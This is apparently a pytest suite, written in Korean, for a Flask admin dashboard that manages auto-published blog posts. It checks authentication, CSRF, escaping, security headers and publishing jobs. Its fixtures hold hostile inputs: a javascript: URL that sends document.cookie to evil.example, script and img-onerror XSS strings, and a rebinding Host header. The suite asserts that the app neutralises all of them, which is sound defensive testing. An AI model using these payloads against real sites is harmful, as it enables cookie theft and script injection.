"""관리자 대시보드 라우트 — 인증, CSRF, 목록/상세, 수동 발행 작업."""
from __future__ import annotations

import re
import threading
from datetime import datetime

import pytest
from werkzeug.security import generate_password_hash

from src.application.use_cases.edit_post import EditPostUseCase
from src.application.use_cases.list_posts import ListPostsUseCase
from src.application.use_cases.publish_selected_post import (
    ManualPublishOutcome,
    ManualPublishResult,
)
from src.domain.entities.post import Post
from src.domain.value_objects.post_content import PostContent
from src.domain.value_objects.post_status import PostStatus
from src.infrastructure.persistence.in_memory_repo import InMemoryPostRepository
from src.interface.web.app import automation_soon, create_app
from src.interface.web.auth import AdminAuthenticator, LoginThrottle
from src.interface.web.jobs import PublishJobRunner

PASSWORD = "correct horse battery"
NOON = datetime(2026, 9, 28, 12, 0)  # 자동 실행과 먼 시각 — 발행 테스트가 시계에 흔들리지 않게


def _post(row, keyword, status=PostStatus.PENDING, body_len=3500):
    return Post(
        row_index=row, keyword=keyword, status=status,
        content=PostContent(title=f"{keyword} 제목", body_markdown="x" * body_len,
                            meta_description="요약"),
        quality_score=90,
    )


class Harness:
    def __init__(self, publish=None, allowed_hosts=None, now=NOON, revise=None):
        self.published_rows: list[int] = []
        published = _post(4, "Kafka 입문", PostStatus.PUBLISHED)
        published.published_url = "https://blog.tistory.com/4"
        hostile = _post(5, "악성 URL", PostStatus.PUBLISHED)
        hostile.published_url = "javascript:fetch('https://evil.example/'+document.cookie)"
        failed = _post(6, "실패 글", PostStatus.FAILED)
        failed.error_message = "본문 붙여넣기 실패"
        self.repo = repo = InMemoryPostRepository([
            _post(2, "OpenTelemetry 구축"),
            _post(3, "Istio <script>alert(1)</script>", body_len=10),
            published,
            hostile,
            failed,
        ])

        def default_publish(row: int) -> ManualPublishResult:
            self.published_rows.append(row)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료",
                                       url=f"https://blog.tistory.com/{row}")

        self.runner = PublishJobRunner(publish=publish or default_publish, revise=revise)
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(repo),
            job_runner=self.runner,
            secret_key="test-secret-key-0123456789",
            throttle=LoginThrottle(max_attempts=3, window_seconds=600),
            allowed_hosts=allowed_hosts,
            edit_post=EditPostUseCase(repo),
            clock=lambda: now,
        )
        app.config["TESTING"] = True
        self.client = app.test_client()

    def csrf(self, path: str = "/login") -> str:
        html = self.client.get(path).get_data(as_text=True)
        match = re.search(r'name="csrf_token" value="([^"]+)"', html)
        assert match, f"CSRF 토큰 없음: {path}"
        return match.group(1)

    def login(self, password: str = PASSWORD, username: str = "admin"):
        return self.client.post("/login", data={
            "username": username, "password": password, "csrf_token": self.csrf(),
        })


@pytest.fixture
def h() -> Harness:
    return Harness()


class TestAuthentication:
    @pytest.mark.parametrize("path", ["/", "/posts/2", "/jobs/abc"])
    def test_로그인_전에는_로그인_페이지로_이동(self, h, path):
        resp = h.client.get(path)
        assert resp.status_code == 302
        assert resp.headers["Location"].startswith("/login")

    def test_로그인_성공(self, h):
        resp = h.login()
        assert resp.status_code == 302
        assert resp.headers["Location"] == "/"
        assert h.client.get("/").status_code == 200

    def test_잘못된_비밀번호(self, h):
        resp = h.login(password="nope")
        assert resp.status_code == 401
        assert "올바르지 않" in resp.get_data(as_text=True)
        assert h.client.get("/").status_code == 302

    def test_반복_실패시_차단(self, h):
        for _ in range(3):
            h.login(password="nope")
        resp = h.login()  # 올바른 비밀번호여도 차단 중
        assert resp.status_code == 429

    def test_CSRF_토큰_없는_로그인_거부(self, h):
        resp = h.client.post("/login", data={"username": "admin", "password": PASSWORD})
        assert resp.status_code == 400

    def test_로그아웃(self, h):
        h.login()
        resp = h.client.post("/logout", data={"csrf_token": h.csrf("/")})
        assert resp.status_code == 302
        assert h.client.get("/").status_code == 302


class TestDashboard:
    def test_목록과_상태_개수(self, h):
        h.login()
        html = h.client.get("/").get_data(as_text=True)
        assert "OpenTelemetry 구축" in html
        assert "Kafka 입문" in html
        assert "발행대기" in html

    def test_상태_필터와_검색(self, h):
        h.login()
        html = h.client.get("/?status=발행완료").get_data(as_text=True)
        assert "Kafka 입문" in html
        assert "OpenTelemetry 구축" not in html
        html = h.client.get("/?q=opentelemetry").get_data(as_text=True)
        assert "OpenTelemetry 구축" in html
        assert "Kafka 입문" not in html

    def test_알수없는_상태값은_전체로_처리(self, h):
        h.login()
        assert h.client.get("/?status=hacked").status_code == 200

    def test_사용자_데이터는_이스케이프(self, h):
        h.login()
        html = h.client.get("/").get_data(as_text=True)
        assert "<script>alert(1)</script>" not in html
        assert "&lt;script&gt;" in html

    def test_상세_페이지에_발행_불가_사유(self, h):
        h.login()
        html = h.client.get("/posts/3").get_data(as_text=True)
        assert "3000" in html
        assert 'action="/posts/3/publish"' not in html

    def test_발행_가능한_게시물은_발행_버튼(self, h):
        h.login()
        html = h.client.get("/posts/2").get_data(as_text=True)
        assert 'action="/posts/2/publish"' in html

    def test_없는_게시물은_404(self, h):
        h.login()
        assert h.client.get("/posts/999").status_code == 404


class TestManualPublish:
    def test_발행_요청은_작업_페이지로_이동하고_결과_표시(self, h):
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        assert resp.status_code == 302
        job_id = resp.headers["Location"].rsplit("/", 1)[-1]
        h.runner.wait(job_id, timeout=5)
        html = h.client.get(f"/jobs/{job_id}").get_data(as_text=True)
        assert "발행 완료" in html
        assert "https://blog.tistory.com/2" in html
        assert h.published_rows == [2]

    def test_CSRF_없는_발행_요청_거부(self, h):
        h.login()
        assert h.client.post("/posts/2/publish").status_code == 400
        assert h.published_rows == []

    def test_진행중_작업이_있으면_새_발행_거부(self):
        release = threading.Event()

        def slow(row):
            release.wait(5)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료")

        h = Harness(publish=slow)
        h.login()
        token = h.csrf("/posts/2")
        first = h.client.post("/posts/2/publish", data={"csrf_token": token})
        second = h.client.post(
            "/posts/2/publish", data={"csrf_token": token}, follow_redirects=True,
        )
        assert "이미 진행 중" in second.get_data(as_text=True)
        release.set()
        h.runner.wait(first.headers["Location"].rsplit("/", 1)[-1], timeout=5)

    def test_실행중_작업_페이지는_자동_새로고침(self):
        release = threading.Event()

        def slow(row):
            release.wait(5)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료")

        h = Harness(publish=slow)
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        job_path = resp.headers["Location"]
        html = h.client.get(job_path).get_data(as_text=True)
        assert 'http-equiv="refresh"' in html
        release.set()
        h.runner.wait(job_path.rsplit("/", 1)[-1], timeout=5)

    def test_없는_작업은_404(self, h):
        h.login()
        assert h.client.get("/jobs/unknown").status_code == 404


class TestSecurityHeaders:
    def test_보안_헤더(self, h):
        resp = h.client.get("/login")
        assert "default-src 'self'" in resp.headers["Content-Security-Policy"]
        assert resp.headers["X-Frame-Options"] == "DENY"
        assert resp.headers["X-Content-Type-Options"] == "nosniff"
        assert "no-store" in resp.headers["Cache-Control"]

    def test_세션_쿠키_플래그(self, h):
        resp = h.login()
        cookie = resp.headers.get("Set-Cookie", "")
        assert "HttpOnly" in cookie
        assert "SameSite=Strict" in cookie

    def test_http_https가_아닌_URL은_링크로_렌더링하지_않음(self, h):
        h.login()
        for path in ("/", "/posts/5"):
            html = h.client.get(path).get_data(as_text=True)
            assert 'href="javascript:' not in html, path
        detail = h.client.get("/posts/4").get_data(as_text=True)
        assert 'href="https://blog.tistory.com/4"' in detail

    def test_허용되지_않은_Host_헤더_거부(self):
        h = Harness(allowed_hosts=frozenset({"127.0.0.1:8787"}))
        assert h.client.get("/login", headers={"Host": "127.0.0.1:8787"}).status_code == 200
        rebound = h.client.get("/login", headers={"Host": "rebind.evil.example:8787"})
        assert rebound.status_code == 400

    def test_favicon은_로그인_없이_빈_응답(self, h):
        assert h.client.get("/favicon.ico").status_code == 204


class TestJobResultUrl:
    def test_작업_결과의_비정상_URL은_링크로_렌더링하지_않음(self):
        def hostile(row):
            return ManualPublishResult(
                ManualPublishOutcome.PUBLISHED, row, "발행 완료", url="javascript:alert(1)",
            )

        h = Harness(publish=hostile)
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        job_path = resp.headers["Location"]
        h.runner.wait(job_path.rsplit("/", 1)[-1], timeout=5)
        assert 'href="javascript:' not in h.client.get(job_path).get_data(as_text=True)


def test_brand_label이_화면에_표시된다():
    repo = InMemoryPostRepository([_post(2, "MCP란")])
    app = create_app(
        authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
        list_posts=ListPostsUseCase(repo),
        job_runner=PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
        ),
        secret_key="test-secret-key-0123456789",
        brand_label="네이버 블로그 관리자",
    )
    app.config["TESTING"] = True
    html = app.test_client().get("/login").get_data(as_text=True)
    assert re.search(r"<title>[^<]*네이버 블로그 관리자[^<]*</title>", html)


def test_상세_화면에_본문이_이스케이프되어_보인다():
    post = _post(2, "MCP란")
    post.content = PostContent(
        title="MCP란?", body_markdown="## 소제목\n\n본문 <img src=x onerror=alert(1)>",
    )
    app = create_app(
        authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
        list_posts=ListPostsUseCase(InMemoryPostRepository([post])),
        job_runner=PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
        ),
        secret_key="test-secret-key-0123456789",
    )
    app.config["TESTING"] = True
    client = app.test_client()
    html = client.get("/login").get_data(as_text=True)
    token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
    client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
    html = client.get("/posts/2").get_data(as_text=True)
    assert re.search(r'<pre class="body">## 소제목\n\n본문 &lt;img', html)
    assert "<img src=x" not in html


class TestEditPost:
    def _edit(self, h, row=2, **fields):
        data = {"title": "새 제목", "category": "TechNova", "tags": "a, b",
                "body": "새 본문", "csrf_token": h.csrf(f"/posts/{row}")}
        data.update(fields)
        return h.client.post(f"/posts/{row}/edit", data=data)

    def _row(self, h, row):
        return next(p for p in h.repo.find_all() if p.row_index == row)

    def test_발행대기_글에는_편집_폼이_있다(self, h):
        h.login()
        html = h.client.get("/posts/2").get_data(as_text=True)
        assert 'action="/posts/2/edit"' in html
        assert "<textarea" in html

    def test_발행된_글도_편집_폼이_있다(self, h):
        h.login()
        assert 'action="/posts/4/edit"' in h.client.get("/posts/4").get_data(as_text=True)

    def test_편집하면_저장하고_상세로_돌아간다(self, h):
        h.login()
        resp = self._edit(h)
        assert resp.status_code == 302 and resp.headers["Location"] == "/posts/2"
        post = self._row(h, 2)
        assert (post.content.title, post.category, post.content.body_markdown) == (
            "새 제목", "TechNova", "새 본문",
        )
        assert "저장했습니다" in h.client.get("/posts/2").get_data(as_text=True)

    def test_CSRF_없는_편집은_거부(self, h):
        h.login()
        resp = h.client.post("/posts/2/edit", data={"title": "x", "body": "y"})
        assert resp.status_code == 400
        assert self._row(h, 2).content.title == "OpenTelemetry 구축 제목"

    def test_제목이나_본문이_비면_저장하지_않는다(self, h):
        h.login()
        resp = self._edit(h, title="  ")
        assert resp.status_code == 400
        assert self._row(h, 2).content.title == "OpenTelemetry 구축 제목"

    def test_너무_긴_값은_저장하지_않는다(self, h):
        h.login()
        assert self._edit(h, title="가" * 151).status_code == 400

    def test_발행된_글을_고치면_수정대기로_바뀐다(self, h):
        h.login()
        resp = self._edit(h, row=4)
        assert resp.status_code == 302
        post = self._row(h, 4)
        assert post.content.title == "새 제목"
        assert post.status == PostStatus.REVISION_PENDING
        assert "수정대기로 바꿨습니다" in h.client.get("/posts/4").get_data(as_text=True)

    def test_편집한_제목도_이스케이프(self, h):
        h.login()
        self._edit(h, title="<img src=x onerror=alert(1)>")
        html = h.client.get("/posts/2").get_data(as_text=True)
        assert "<img src=x" not in html

    def test_실패_글은_발행대기로_되돌린다(self, h):
        h.login()
        html = h.client.get("/posts/6").get_data(as_text=True)
        assert 'action="/posts/6/restore"' in html
        resp = h.client.post("/posts/6/restore", data={"csrf_token": h.csrf("/posts/6")})
        assert resp.status_code == 302
        post = self._row(h, 6)
        assert post.status == PostStatus.PENDING and post.error_message == ""

    def test_발행대기_글은_되돌리기_버튼이_없고_요청도_거부(self, h):
        h.login()
        assert 'action="/posts/2/restore"' not in h.client.get("/posts/2").get_data(as_text=True)
        resp = h.client.post("/posts/2/restore", data={"csrf_token": h.csrf("/posts/2")})
        assert resp.status_code == 409


class TestPreviewAndDraft:
    def _app(self, draft_calls):
        repo = InMemoryPostRepository([_post(2, "MCP란")])

        def draft(row):
            draft_calls.append(row)
            return ManualPublishResult(ManualPublishOutcome.DRAFTED, row, "임시저장 완료")

        runner = PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
            draft=draft,
        )
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(repo),
            job_runner=runner,
            secret_key="test-secret-key-0123456789",
            preview=lambda post: f'<div class="photo">사진</div><p class="c">{post.keyword}</p>',
        )
        app.config["TESTING"] = True
        client = app.test_client()
        html = client.get("/login").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
        return client, runner

    def _token(self, client, path):
        html = client.get(path).get_data(as_text=True)
        return re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)

    def test_상세에_미리보기_링크와_임시저장_시험_버튼(self):
        client, _ = self._app([])
        html = client.get("/posts/2").get_data(as_text=True)
        assert 'href="/posts/2/preview"' in html
        assert 'action="/posts/2/draft"' in html

    def test_미리보기는_변환된_HTML을_보여준다(self):
        client, _ = self._app([])
        html = client.get("/posts/2/preview").get_data(as_text=True)
        assert '<div class="photo">사진</div><p class="c">MCP란</p>' in html

    def test_임시저장_시험은_작업으로_돌고_결과를_보여준다(self):
        calls: list[int] = []
        client, runner = self._app(calls)
        resp = client.post("/posts/2/draft", data={"csrf_token": self._token(client, "/posts/2")})
        job_id = resp.headers["Location"].rsplit("/", 1)[-1]
        runner.wait(job_id, timeout=5)
        html = client.get(f"/jobs/{job_id}").get_data(as_text=True)
        assert calls == [2]
        assert "임시저장 완료" in html and "notice-success" in html
        assert "임시저장 시험" in html

    def test_CSRF_없는_임시저장_시험은_거부(self):
        calls: list[int] = []
        client, _ = self._app(calls)
        assert client.post("/posts/2/draft").status_code == 400
        assert calls == []


class _FakeDesk:
    source = "네이버 검색량"

    def __init__(self):
        self.registered: list[str] = []

    def suggest(self):
        from src.interface.web.app import KeywordIdea

        return [KeywordIdea("RAG란", "월 1,200회 · AI 실무"), KeywordIdea("<b>XSS</b>란")]

    def register(self, keyword):
        from src.application.use_cases.register_keyword import DuplicateKeywordError

        if keyword == "MCP란":
            raise DuplicateKeywordError(keyword, "MCP란")
        self.registered.append(keyword)
        return 7


class TestKeywords:
    def _client(self):
        desk = _FakeDesk()
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(InMemoryPostRepository([])),
            job_runner=PublishJobRunner(
                publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
            ),
            secret_key="test-secret-key-0123456789",
            keywords=desk,
        )
        app.config["TESTING"] = True
        client = app.test_client()
        html = client.get("/login").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
        return client, desk

    def _post(self, client, keyword):
        html = client.get("/keywords").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        return client.post("/keywords", data={"keyword": keyword, "csrf_token": token})

    def test_추천_목록과_등록_버튼(self):
        client, _ = self._client()
        html = client.get("/keywords").get_data(as_text=True)
        assert 'value="RAG란"' in html
        assert "<b>XSS</b>" not in html and "&lt;b&gt;XSS" in html
        assert "월 1,200회 · AI 실무" in html and "네이버 검색량" in html
        assert 'href="/keywords"' in client.get("/").get_data(as_text=True)

    def test_등록하면_행_번호를_알려준다(self):
        client, desk = self._client()
        resp = self._post(client, "  감마 AI PPT 만들기 ")
        assert resp.status_code == 302
        assert desk.registered == ["감마 AI PPT 만들기"]
        assert "7행" in client.get("/keywords").get_data(as_text=True)

    def test_중복이면_겹친_키워드를_보여주고_등록하지_않는다(self):
        client, desk = self._client()
        self._post(client, "MCP란")
        assert desk.registered == []
        assert "이미 있는" in client.get("/keywords").get_data(as_text=True)

    @pytest.mark.parametrize("keyword", ["", "   ", "가" * 61])
    def test_빈_값이나_너무_긴_키워드는_거부(self, keyword):
        client, desk = self._client()
        assert self._post(client, keyword).status_code == 400
        assert desk.registered == []

    def test_CSRF_없는_등록은_거부(self):
        client, desk = self._client()
        assert client.post("/keywords", data={"keyword": "x"}).status_code == 400
        assert desk.registered == []


class TestGenerate:
    def _client(self, calls):
        def generate(row):
            calls.append(row)
            return ManualPublishResult(
                ManualPublishOutcome.GENERATED, row, "생성 완료 — 발행대기 3건 (+2)",
            )

        runner = PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
            generate=generate,
        )
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(InMemoryPostRepository([])),
            job_runner=runner,
            secret_key="test-secret-key-0123456789",
        )
        app.config["TESTING"] = True
        client = app.test_client()
        html = client.get("/login").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
        return client, runner

    def test_목록에_지금_생성_버튼(self):
        client, _ = self._client([])
        assert 'action="/generate"' in client.get("/").get_data(as_text=True)

    def test_생성은_작업으로_돌고_목록으로_돌아가는_링크(self):
        calls: list[int] = []
        client, runner = self._client(calls)
        html = client.get("/").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        resp = client.post("/generate", data={"csrf_token": token})
        job_id = resp.headers["Location"].rsplit("/", 1)[-1]
        runner.wait(job_id, timeout=5)
        page = client.get(f"/jobs/{job_id}").get_data(as_text=True)
        assert calls == [0]
        assert "글 생성" in page and "notice-success" in page and "발행대기 3건" in page
        assert 'href="/"' in page

    def test_CSRF_없는_생성은_거부(self):
        calls: list[int] = []
        client, _ = self._client(calls)
        assert client.post("/generate").status_code == 400
        assert calls == []


def _status_client(daily_limit):
    from datetime import datetime

    published = _post(4, "오늘 글", PostStatus.PUBLISHED)
    published.published_url = "https://blog.naver.com/a/4"
    published.published_at = datetime.now()
    app = create_app(
        authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
        list_posts=ListPostsUseCase(InMemoryPostRepository([published, _post(2, "대기")])),
        job_runner=PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
        ),
        secret_key="test-secret-key-0123456789",
        daily_limit=daily_limit,
    )
    app.config["TESTING"] = True
    client = app.test_client()
    html = client.get("/login").get_data(as_text=True)
    token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
    client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
    return client.get("/").get_data(as_text=True)


def test_목록_위에_오늘_발행_현황과_최근_발행():
    html = _status_client(daily_limit=15)
    assert "오늘 발행 1 / 15" in html
    assert 'href="https://blog.naver.com/a/4"' in html and "오늘 글" in html
    assert "내일" not in html


def test_한도를_채우면_내일_다시_가능하다고_알린다():
    assert "내일 다시 발행할 수 있습니다" in _status_client(daily_limit=1)


def test_생성_기능이_없는_앱에는_버튼도_경로도_없다(h):
    h.login()
    assert 'action="/generate"' not in h.client.get("/").get_data(as_text=True)
    resp = h.client.post("/generate", data={"csrf_token": h.csrf("/")})
    assert resp.status_code == 404


def test_미리보기와_시험이_없는_앱에는_버튼도_없다(h):
    h.login()
    html = h.client.get("/posts/2").get_data(as_text=True)
    assert "/preview" not in html and "/draft" not in html
    assert h.client.get("/posts/2/preview").status_code == 404


@pytest.mark.parametrize(("now", "expected"), [
    (datetime(2026, 9, 28, 8, 45), "09:00"),   # 이미 시작한 08:30은 락이 거부
    (datetime(2026, 9, 28, 13, 50), "14:00"),
    (datetime(2026, 9, 28, 23, 50), "00:00"),  # 자정을 넘는 실행
    (datetime(2026, 9, 28, 12, 0), None),
    (datetime(2026, 9, 28, 9, 0, 30), None),   # 이미 시작한 실행은 락이 막는다
])
def test_자동_실행_직전인지(now, expected):
    found = automation_soon(now)
    assert (found.strftime("%H:%M") if found else None) == expected


def test_자동_실행_직전에는_발행을_막는다():
    h = Harness(now=datetime(2026, 9, 28, 8, 50))
    h.login()
    resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")},
                         follow_redirects=True)
    assert "09:00 자동 실행" in resp.get_data(as_text=True)
    assert h.published_rows == []


def _revise_harness(now=NOON):
    revised: list[int] = []

    def revise(row: int) -> ManualPublishResult:
        revised.append(row)
        return ManualPublishResult(ManualPublishOutcome.REVISED, row, "수정 발행 완료")

    h = Harness(revise=revise, now=now)
    h.login()
    post = next(p for p in h.repo.find_all() if p.row_index == 4)
    post.status = PostStatus.REVISION_PENDING
    post.entry_id = "4"
    return h, revised


def test_수정대기_글은_수정_발행으로_작업을_돌린다():
    h, revised = _revise_harness()
    assert 'action="/posts/4/revise"' in h.client.get("/posts/4").get_data(as_text=True)
    resp = h.client.post("/posts/4/revise", data={"csrf_token": h.csrf("/posts/4")})
    job_id = resp.headers["Location"].rsplit("/", 1)[-1]
    h.runner.wait(job_id, timeout=5)
    assert revised == [4]
    assert "수정 발행" in h.client.get(f"/jobs/{job_id}").get_data(as_text=True)


def test_수정대기가_아니면_수정_발행_버튼이_없다():
    h, _ = _revise_harness()
    assert "/revise" not in h.client.get("/posts/2").get_data(as_text=True)


def test_수정_발행_기능이_없는_앱은_404():
    h = Harness()
    h.login()
    resp = h.client.post("/posts/4/revise", data={"csrf_token": h.csrf("/posts/4")})
    assert resp.status_code == 404


def test_자동_실행_직전에는_수정_발행도_막는다():
    h, revised = _revise_harness(now=datetime(2026, 9, 28, 9, 50))
    resp = h.client.post("/posts/4/revise", data={"csrf_token": h.csrf("/posts/4")},
                         follow_redirects=True)
    assert "10:00 자동 실행" in resp.get_data(as_text=True)
    assert revised == []


class TestNaverLogin:
    def _client(self, calls, now=NOON):
        def login(row):
            calls.append(row)
            return ManualPublishResult(ManualPublishOutcome.LOGGED_IN, row, "네이버 로그인 성공")

        runner = PublishJobRunner(
            publish=lambda row: ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "ok"),
            login=login,
        )
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(InMemoryPostRepository([])),
            job_runner=runner,
            secret_key="test-secret-key-0123456789",
            clock=lambda: now,
        )
        app.config["TESTING"] = True
        client = app.test_client()
        html = client.get("/login").get_data(as_text=True)
        token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
        client.post("/login", data={"username": "admin", "password": PASSWORD, "csrf_token": token})
        return client, runner

    def _token(self, client):
        html = client.get("/").get_data(as_text=True)
        return re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)

    def test_네이버_대시보드에만_버튼이_있다(self):
        client, _ = self._client([])
        assert 'action="/naver/login"' in client.get("/").get_data(as_text=True)
        h = Harness()
        h.login()
        assert 'action="/naver/login"' not in h.client.get("/").get_data(as_text=True)
        assert h.client.post("/naver/login", data={"csrf_token": h.csrf("/")}).status_code == 404

    def test_로그인은_작업으로_돈다(self):
        calls: list[int] = []
        client, runner = self._client(calls)
        resp = client.post("/naver/login", data={"csrf_token": self._token(client)})
        job_id = resp.headers["Location"].rsplit("/", 1)[-1]
        job = runner.wait(job_id, timeout=5)
        assert job.result.outcome is ManualPublishOutcome.LOGGED_IN and calls == [0]
        html = client.get(f"/jobs/{job_id}").get_data(as_text=True)
        assert "notice-success" in html and "네이버 로그인" in html

    def test_CSRF_없으면_거부(self):
        calls: list[int] = []
        client, _ = self._client(calls)
        assert client.post("/naver/login").status_code == 400
        assert calls == []

    def test_자동_실행_직전에는_거부(self):
        calls: list[int] = []
        client, _ = self._client(calls, now=datetime(2026, 9, 28, 8, 50))
        resp = client.post("/naver/login", data={"csrf_token": self._token(client)},
                           follow_redirects=True)
        assert "09:00 자동 실행" in resp.get_data(as_text=True) and calls == []


def test_아침_점검_시각도_자동_실행으로_본다():
    found = automation_soon(datetime(2026, 9, 28, 7, 20))
    assert found is not None and found.strftime("%H:%M") == "07:30"


def test_미발행_글은_다시_생성과_보관():
    h = Harness()
    h.login()
    detail = h.client.get("/posts/2").get_data(as_text=True)
    assert 'action="/posts/2/regenerate"' in detail and 'action="/posts/2/archive"' in detail
    published = h.client.get("/posts/4").get_data(as_text=True)
    assert "/regenerate" not in published and "/archive" not in published

    h.client.post("/posts/2/archive", data={"csrf_token": h.csrf("/posts/2")})
    assert next(p for p in h.repo.find_all() if p.row_index == 2).status == PostStatus.HOLD
    h.client.post("/posts/2/regenerate", data={"csrf_token": h.csrf("/posts/2")})
    assert next(p for p in h.repo.find_all() if p.row_index == 2).status == PostStatus.WAITING

    resp = h.client.post("/posts/4/regenerate", data={"csrf_token": h.csrf("/posts/4")})
    assert resp.status_code == 409
    assert h.client.post("/posts/2/archive").status_code == 400  # CSRF 없음
